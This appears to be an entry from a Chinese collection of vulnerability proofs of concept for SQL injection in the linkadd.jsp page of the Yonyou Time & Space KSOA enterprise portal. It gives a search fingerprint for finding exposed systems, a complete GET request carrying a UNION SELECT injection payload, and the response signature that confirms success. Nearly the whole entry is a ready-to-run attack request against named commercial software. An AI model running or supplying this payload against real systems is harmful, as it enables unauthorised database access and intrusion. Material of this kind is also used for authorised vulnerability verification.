# 用友时空KSOAlinkadd.jspSQL注入

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="企业信息系统门户"`
- **请求**：`GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27 HTTP/1.1`
- **响应特征**：200 49ba59abbe56e057